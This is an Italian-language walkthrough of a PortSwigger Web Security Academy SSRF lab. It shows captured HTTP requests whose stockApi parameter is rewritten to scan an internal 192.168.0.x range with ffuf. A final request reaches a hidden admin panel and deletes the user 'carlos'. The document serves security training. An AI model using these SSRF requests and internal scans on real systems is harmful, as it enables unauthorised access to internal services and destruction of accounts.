https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system

Non abbiamo delle credenziali.

Verifichiamo la richiesta che corrisponde al menu "View details"

![](_attachment/Pasted%20image%2020250329171005.png)

e successivamente "Check stock"

![](_attachment/Pasted%20image%2020250329171022.png)

```http
POST /product/stock HTTP/2
Host: 0a8a00650496da4d805b8f5900490097.web-security-academy.net
Cookie: session=zeCtYReBJVBFwAlRJR3rgSvVwttPKBbU
Content-Length: 96
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: it-IT,it;q=0.9
Sec-Ch-Ua: "Not:A-Brand";v="24", "Chromium";v="134"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a8a00650496da4d805b8f5900490097.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a8a00650496da4d805b8f5900490097.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

url decode: `http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1`

proviamo a verificare l'esistenza di `/admin`

Popolo un semplice file di testo con gli ip da `192.168.0.1` a `192.168.0.254`

```bash
joshua@kaligra:~$ for i in $(seq 1 254); do echo $i >> /tmp/ips.txt ; done
joshua@kaligra:~$
```

Salvo la richiesta di cui sopra e immetto la stringa **FUZZ** nel posto giusto:

```http
joshua@kaligra:~$ cat /tmp/req.txt
POST /product/stock HTTP/2
Host: 0a8a00650496da4d805b8f5900490097.web-security-academy.net
Cookie: session=zeCtYReBJVBFwAlRJR3rgSvVwttPKBbU
Content-Length: 49
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: it-IT,it;q=0.9
Sec-Ch-Ua: "Not:A-Brand";v="24", "Chromium";v="134"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a8a00650496da4d805b8f5900490097.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a8a00650496da4d805b8f5900490097.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive

stockApi=http%3A%2F%2F192.168.0.FUZZ%3A8080%2Fadmin
```

uso `ffuf` e scarto tutte le richieste con size=2350

```bash
joshua@kaligra:~$ ffuf --request /tmp/req.txt -w /tmp/ips.txt -fs 2350

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : https://0a8a00650496da4d805b8f5900490097.web-security-academy.net/product/stock
 :: Wordlist         : FUZZ: /tmp/ips.txt
 :: Header           : Host: 0a8a00650496da4d805b8f5900490097.web-security-academy.net
 :: Header           : Cookie: session=zeCtYReBJVBFwAlRJR3rgSvVwttPKBbU
...
...
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2350
________________________________________________

199                     [Status: 200, Size: 3141, Words: 1368, Lines: 67, Duration: 81ms]
:: Progress: [254/254] :: Job [1/1] :: 86 req/sec :: Duration: [0:00:03] :: Errors: 0 ::

```

Ho trovato l'ip interno `192.168.0.199`

Nel body HTML rileviamo:

```html
                   <section>
                        <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/http://192.168.0.199:8080/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/http://192.168.0.199:8080/admin/delete?username=carlos">Delete</a>
                        </div>
                    </section>
                    <br>
                    <hr>
                </div>
            </section>
```

```http
POST /product/stock HTTP/2
Host: 0a8a00650496da4d805b8f5900490097.web-security-academy.net
Cookie: session=zeCtYReBJVBFwAlRJR3rgSvVwttPKBbU
Content-Length: 85
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: it-IT,it;q=0.9
Sec-Ch-Ua: "Not:A-Brand";v="24", "Chromium";v="134"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a8a00650496da4d805b8f5900490097.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a8a00650496da4d805b8f5900490097.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

stockApi=http%3A%2F%2F192%2E168%2E0%2E199%3A8080%2Fadmin%2Fdelete%3Fusername%3Dcarlos
```

follow redirection...

![](_attachment/Pasted%20image%2020250329173228.png)

